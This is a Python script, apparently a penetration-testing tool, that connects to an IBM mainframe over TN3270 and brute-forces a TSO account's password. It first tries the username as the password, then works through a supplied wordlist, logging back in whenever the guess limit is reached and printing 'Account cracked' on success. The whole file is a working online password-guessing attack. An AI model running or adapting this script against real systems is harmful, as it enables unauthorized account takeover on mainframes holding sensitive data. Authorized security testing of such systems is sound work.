from py3270 import Emulator
import sys
import time

python_version = sys.version_info[0]	

if len(sys.argv) <= 4:
	print("\nUsage: tsoUserEnum.py <host> <port> <username> <path to password list>")
	sys.exit()

host = sys.argv[1]
port = sys.argv[2]
username = sys.argv[3]
password_list_location = sys.argv[4]

delay_time = 0.1
cracking_loop_delay_time = 0.2

def file2list(filename):
	lines = []
	with open(filename) as file:
    		lines = file.readlines()
    		lines = [line.rstrip() for line in lines]
	return lines

def user_as_password():
	# use x3270 so you can see what is going on
	#em = Emulator(visible=True)

	# or not (uses s3270)
	em = Emulator()

	# connect to host
	em.connect('%s:%d' % (host, int(port)))
	em.wait_for_field()
	time.sleep(delay_time)
	
	# enter 'tso' at the VTAM prompt
	em.fill_field(21, 22, 'tso', 3)
	em.send_enter()
	em.wait_for_field()
	time.sleep(delay_time)
		
	# enter username	
	em.send_string(username, None, None)
	em.send_enter()
	em.wait_for_field()
	time.sleep(delay_time)
		
	if em.string_found(2, 2, 'IKJ56420I'): # userID is not recognised
		print("[-] Account: " + username + " is not valid")	
		sys.exit()
	else:
		None		

	# try username as password
	#print("[i] Trying: " + username + ":" + username)
	em.send_string(username, None, None)
	em.send_enter()
	em.wait_for_field()
	time.sleep(delay_time)
	
	if em.string_found(2, 2, 'IKJ56421I'):
		#print("[-] Password: " + passwords[count] + " is not valid")
		None
	elif em.string_found(2, 2, '***      '):
		print("[+] Lucky punch! Account cracked: " + username + ":" + username)
		em.terminate()
		sys.exit()  
	elif em.string_found(2, 2, 'IKT00300I'):
		print("[+] Lucky punch! Account cracked: " + username + ":" + username)
		em.terminate()
		sys.exit()  
	elif em.string_found(2, 2, 'ICH70001I'):
		print("[+] Lucky punch! Account cracked: " + username + ":" + username)
		em.terminate()
		sys.exit()  
	else:
		#print("[-] Something weird happened")
		#message = em.string_get(1,2,9)
		#print("[i] Message: ", message)
		#message = em.string_get(2,2,9)
		#print("[i] Message: ", message)
		#time.sleep(3)
		None
	
def user_enum(count, passwords, number_of_passwords):
	# use x3270 so you can see what is going on
	#em = Emulator(visible=True)

	# or not (uses s3270)
	em = Emulator()

	# connect to host
	em.connect('%s:%d' % (host, int(port)))
	em.wait_for_field()
	time.sleep(delay_time)
	
	# enter 'tso' at the VTAM prompt
	em.fill_field(21, 22, 'tso', 3)
	em.send_enter()
	em.wait_for_field()
	time.sleep(delay_time)
		
	# enter username	
	em.send_string(username, None, None)
	em.send_enter()
	em.wait_for_field()
	time.sleep(delay_time)
		
	if em.string_found(2, 2, 'IKJ56420I'): # userID is not recognised
		print("[-] Account: " + username + " is not valid")	
		sys.exit()
	else:
		None		

	# password brute forcing loop
	while count < number_of_passwords:
		# try the next password in the list	
		em.send_string(passwords[count], None, None)
		em.send_enter()
		em.wait_for_field()
		time.sleep(cracking_loop_delay_time)
		if em.string_found(2, 2, 'IKJ56421I'):
			#print("[-] Password: " + passwords[count] + " is not valid")
			None
		elif em.string_found(1, 2, 'Mainframe'):
			#print("[i] Guesses exceeded, logging back in")
			em.terminate()
			return count  
		elif em.string_found(2, 2, '***      '):
			print("\n[" + str(count+1) + "] Account cracked: " + username + ":" + passwords[count])
			em.terminate()
			sys.exit()  
		elif em.string_found(2, 2, 'IKT00300I'):
			print("\n[" + str(count+1) + "] Account cracked: " + username + ":" + passwords[count])
			em.terminate()
			sys.exit()  
		elif em.string_found(2, 2, 'ICH70001I'):
			print("\n[" + str(count+1) + "] Account cracked: " + username + ":" + passwords[count])
			em.terminate()
			sys.exit()  
		else:
			#print("[-] Something weird happened")
			#message = em.string_get(1,2,9)
			#print("[i] Message: ", message)
			#message = em.string_get(2,2,9)
			#print("[i] Message: ", message)
			#time.sleep(3)
			None

		count += 1
		if python_version == 3:
			sys.stdout.write('\r')
			j = (count+ 1) / number_of_passwords
			sys.stdout.write("[%-20s] %d%%" % ('='*int(20*j), 100*j))
			sys.stdout.flush()
		else:	
			if count % 10 == 0:
				print("["+str(count)+"]")
	# disconnect from host and kill subprocess
	em.terminate()
	return count

# define a list of passwords
passwords = file2list(password_list_location)
number_of_passwords = len(passwords)

progress = 0
n = 21

print("\n[i] Attempting to brute force " + username + " account with " + str(number_of_passwords) + " passwords\n")

user_as_password()

while progress < number_of_passwords:
	progress = user_enum(progress, passwords, number_of_passwords)

